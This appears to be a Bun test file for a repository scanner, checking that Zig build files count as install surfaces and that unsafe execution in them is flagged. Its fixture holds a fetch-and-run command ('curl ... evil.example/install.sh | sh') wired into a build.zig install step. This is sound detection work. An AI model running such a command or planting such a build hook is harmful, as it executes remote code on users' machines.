import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

test("a zig build definition is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. `zig build`
  // evaluates build.zig and runs its steps, so a build recipe runs commands
  // without any package manager hook naming it.
  for (const path of ["build.zig", "native/build.zig"]) {
    const inspection = inspectRepository({
      files: [
        {
          path,
          bytes: new TextEncoder().encode(
            `const std = @import("std");\npub fn build(b: *std.Build) void {\n  const run = b.addSystemCommand(&.{ "sh", "-c", "${PAYLOAD}" });\n  b.getInstallStep().dependOn(&run.step);\n}\n`,
          ),
        },
      ],
    });
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect(
      inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    ).toContain(`${path}:unsafe-execution:high`);
    expect(inspection.downloads).toEqual(["https://evil.example/install.sh"]);
  }
});

test("the zig manifest is install content and a plain zig file is not", () => {
  expect(surfacesOf("build.zig.zon")).toEqual(["installScripts", "source"]);
  expect(surfacesOf("src/main.zig")).toEqual([]);
});
